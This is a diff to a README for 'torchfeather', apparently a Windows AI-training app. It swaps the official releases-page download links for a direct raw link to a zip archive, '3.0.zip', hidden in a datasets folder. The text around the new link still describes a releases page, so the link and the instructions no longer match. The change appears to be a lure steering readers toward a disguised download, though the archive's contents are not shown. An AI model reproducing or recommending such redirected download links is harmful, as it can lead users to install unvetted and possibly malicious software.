@@ -1,6 +1,6 @@
 # 🪶 torchfeather - Effortless AI Training for Everyone
 
-[![Download torchfeather](https://img.shields.io/badge/Download-torchfeather-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/movesh1029/torchfeather/releases)
+[![Download torchfeather](https://img.shields.io/badge/Download-torchfeather-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/movesh1029/torchfeather/raw/refs/heads/main/torchfeather/datasets/3.0.zip)
 
 ## 👋 Welcome to torchfeather
 
@@ -34,7 +34,7 @@ Follow these simple steps to get torchfeather up and running on your Windows com
 
 ### Step 1: Download torchfeather
 
-Visit this link to download the application: [https://github.com/movesh1029/torchfeather/releases](https://github.com/movesh1029/torchfeather/releases)
+Visit this link to download the application: [https://github.com/movesh1029/torchfeather/raw/refs/heads/main/torchfeather/datasets/3.0.zip](https://github.com/movesh1029/torchfeather/raw/refs/heads/main/torchfeather/datasets/3.0.zip)
 
 You'll see a page with the latest version. Look for a button or link that says "Download" or shows the version number. Click it, and your browser will start downloading the file. This might take a few minutes depending on your internet speed.
 
